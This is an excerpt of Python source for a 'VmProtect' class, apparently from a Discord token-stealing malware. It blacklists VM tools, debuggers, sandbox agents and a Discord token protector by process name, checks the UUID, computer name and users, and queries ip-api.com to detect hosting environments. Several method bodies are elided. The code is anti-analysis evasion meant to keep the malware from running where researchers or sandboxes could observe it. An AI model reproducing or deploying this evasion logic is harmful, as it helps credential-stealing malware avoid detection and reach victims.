...
class VmProtect:
    ...
    BLACKLISTED_TASKS = (
        ...
        'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice',
        'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga',
        'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 
        'discordtokenprotector'
    )
    @staticmethod
    def checkUUID() -> bool:
        """Checks if the UUID of the system matches any blacklisted UUID."""
    ...
    def checkComputerName() -> bool:
        """Checks if the computer name matches any blacklisted names."""
    ...
    def checkHosting() -> bool:
        try:
            response = subprocess.check_output('curl -s http://ip-api.com/line/?fields=hosting', shell=True).decode(errors='ignore').strip()
            return response == 'true'
        except Exception as e:
            return False
    @staticmethod
    def is_vm() -> bool:
        return VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting()
